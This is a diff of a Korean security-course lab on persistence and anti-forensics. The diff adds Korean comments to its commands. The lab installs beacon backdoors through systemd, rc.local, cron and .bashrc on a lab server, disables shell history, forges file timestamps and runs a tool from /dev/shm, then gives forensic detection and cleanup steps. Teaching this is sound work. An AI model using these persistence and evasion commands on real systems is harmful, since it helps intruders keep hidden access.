@@ -213,9 +213,9 @@ Restart=always
 WantedBy=multi-user.target
 EOF
 
-sudo systemctl daemon-reload
-sudo systemctl enable sysupdate.service
-sudo systemctl start sysupdate.service
+sudo systemctl daemon-reload                           # 서비스 관리
+sudo systemctl enable sysupdate.service                # 부팅 시 자동시작 설정
+sudo systemctl start sysupdate.service                 # 서비스 시작
 
 # rc.local 수정 (구형 시스템)
 sudo sh -c 'echo "nohup /tmp/.hidden/beacon.sh &" >> /etc/rc.local'
@@ -429,19 +429,21 @@ rm -f /tmp/week12_key /tmp/week12_key.pub
 
 ### 실습 2: Cron 백도어 설치 및 제거
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
 # 1. web 서버에 비콘 cron 등록 (매분 /tmp에 타임스탬프 기록)
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'REMOTE'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'REMOTE'  # 비밀번호 자동입력 SSH
 # 현재 cron 확인
 echo "=== 설치 전 cron ==="
-crontab -l 2>/dev/null || echo "(cron 없음)"
+crontab -l 2>/dev/null || echo "(cron 없음)"             # 크론 스케줄 관리
 
 # 백도어 cron 추가 (안전한 비콘: 파일에 기록만)
 (crontab -l 2>/dev/null; echo "* * * * * echo \$(date) >> /tmp/beacon.log 2>/dev/null") | crontab -
 
 echo ""
 echo "=== 설치 후 cron ==="
-crontab -l
+crontab -l                                             # 크론 스케줄 관리
 REMOTE
 
 # 2. 1분 대기 후 비콘 동작 확인
@@ -455,22 +457,24 @@ sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
 # Thu Mar 27 10:01:01 KST 2026
 
 # 3. 정리: cron 백도어 제거
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'CLEANUP'
-crontab -l 2>/dev/null | grep -v "beacon.log" | crontab -
-rm -f /tmp/beacon.log
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'CLEANUP'  # 비밀번호 자동입력 SSH
+crontab -l 2>/dev/null | grep -v "beacon.log" | crontab -  # 크론 스케줄 관리
+rm -f /tmp/beacon.log                                  # 파일 삭제
 echo "=== 정리 후 cron ==="
-crontab -l 2>/dev/null || echo "(cron 없음)"
+crontab -l 2>/dev/null || echo "(cron 없음)"             # 크론 스케줄 관리
 echo "cron 백도어 제거 완료"
 CLEANUP
 ```
 
 ### 실습 3: 시작 스크립트 백도어
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
 # 1. .bashrc에 백도어 추가
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'REMOTE'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'REMOTE'  # 비밀번호 자동입력 SSH
 # 백업 생성
-cp ~/.bashrc ~/.bashrc.backup
+cp ~/.bashrc ~/.bashrc.backup                          # 파일 복사
 
 # .bashrc에 비콘 추가
 echo '# system update check' >> ~/.bashrc
@@ -485,21 +489,23 @@ sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
   "cat /tmp/login_beacon.log 2>/dev/null && echo '--- 비콘 동작 확인'"
 
 # 3. 정리
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'CLEANUP'
-cp ~/.bashrc.backup ~/.bashrc
-rm -f /tmp/login_beacon.log ~/.bashrc.backup
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'CLEANUP'  # 비밀번호 자동입력 SSH
+cp ~/.bashrc.backup ~/.bashrc                          # 파일 복사
+rm -f /tmp/login_beacon.log ~/.bashrc.backup           # 파일 삭제
 echo ".bashrc 복원 완료"
 CLEANUP
 ```
 
 ### 실습 4: 안티포렌식 기법 시연
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
 # web 서버 접속
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'REMOTE'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'REMOTE'  # 비밀번호 자동입력 SSH
 echo "===== 1. 히스토리 비활성화 ====="
 echo "현재 HISTFILE: ${HISTFILE:-~/.bash_history}"
-export HISTFILE=/dev/null
+export HISTFILE=/dev/null                              # 환경 변수 설정
 echo "변경 후 HISTFILE: $HISTFILE"
 echo "(이후 명령은 기록되지 않음)"
 
@@ -511,7 +517,7 @@ echo "원래 시간:"
 stat /tmp/timestamp_test | grep Modify
 
 # 타임스탬프 변경
-touch -t 202501010000 /tmp/timestamp_test
+touch -t 202501010000 /tmp/timestamp_test              # 빈 파일 생성
 echo "변경된 시간:"
 stat /tmp/timestamp_test | grep Modify
 
@@ -519,15 +525,15 @@ echo ""
 echo "===== 3. /dev/shm 실행 (메모리 전용) ====="
 echo '#!/bin/bash' > /dev/shm/memtool
 echo 'echo "메모리에서 실행 중: PID=$$"' >> /dev/shm/memtool
-chmod +x /dev/shm/memtool
+chmod +x /dev/shm/memtool                              # 파일 권한 변경
 /dev/shm/memtool
-rm /dev/shm/memtool
+rm /dev/shm/memtool                                    # 파일 삭제
 echo "/dev/shm 내용 (도구 삭제 후):"
 ls /dev/shm/memtool 2>/dev/null || echo "(파일 없음 - 흔적 제거됨)"
 
 echo ""
 echo "===== 4. 정리 ====="
-rm -f /tmp/timestamp_test
+rm -f /tmp/timestamp_test                              # 파일 삭제
 echo "실습 흔적 제거 완료"
 REMOTE
 ```
@@ -538,14 +544,14 @@ REMOTE
 
 ```bash
 # web 서버에서 포렌식 조사 수행
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'FORENSIC'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'FORENSIC'  # 비밀번호 자동입력 SSH
 echo "=========================================="
 echo "  포렌식 타임라인 재구성"
 echo "=========================================="
 
 echo ""
 echo "===== 1. 최근 로그인 기록 ====="
-last -10 2>/dev/null || echo "last 명령 사용 불가"
+last -10 2>/dev/null || echo "last 명령 사용 불가"           # 로그인 이력 조회
 
 echo ""
 echo "===== 2. SSH 인증 로그 ====="
@@ -554,7 +560,7 @@ sudo grep "Accepted\|Failed" /var/log/auth.log 2>/dev/null | tail -10 || \
 
 echo ""
 echo "===== 3. 최근 24시간 내 수정된 설정 파일 ====="
-find /etc -mtime -1 -type f 2>/dev/null | head -10
+find /etc -mtime -1 -type f 2>/dev/null | head -10     # 시간 기준 파일 검색
 
 echo ""
 echo "===== 4. authorized_keys 점검 ====="
@@ -566,22 +572,22 @@ sudo cat /root/.ssh/authorized_keys 2>/dev/null || echo "(없음)"
 echo ""
 echo "===== 5. cron 점검 ====="
 echo "--- user cron ---"
-crontab -l 2>/dev/null || echo "(없음)"
+crontab -l 2>/dev/null || echo "(없음)"                  # 크론 스케줄 관리
 echo "--- root cron ---"
-sudo crontab -l 2>/dev/null || echo "(없음)"
+sudo crontab -l 2>/dev/null || echo "(없음)"             # 크론 스케줄 관리
 echo "--- /etc/cron.d ---"
 ls -la /etc/cron.d/ 2>/dev/null
 
 echo ""
 echo "===== 6. 의심스러운 사용자 계정 ====="
 echo "UID 0 계정:"
-awk -F: '$3==0 {print $1}' /etc/passwd
+awk -F: '$3==0 {print $1}' /etc/passwd                 # 텍스트 필드 처리
 echo "최근 추가된 계정:"
 ls -lt /home/ 2>/dev/null
 
 echo ""
 echo "===== 7. 의심스러운 서비스 ====="
-systemctl list-unit-files --state=enabled 2>/dev/null | grep -v "vendor preset" | tail -10
+systemctl list-unit-files --state=enabled 2>/dev/null | grep -v "vendor preset" | tail -10  # 부팅 시 자동시작 설정
 
 echo ""
 echo "===== 8. /dev/shm 및 /tmp 점검 ====="
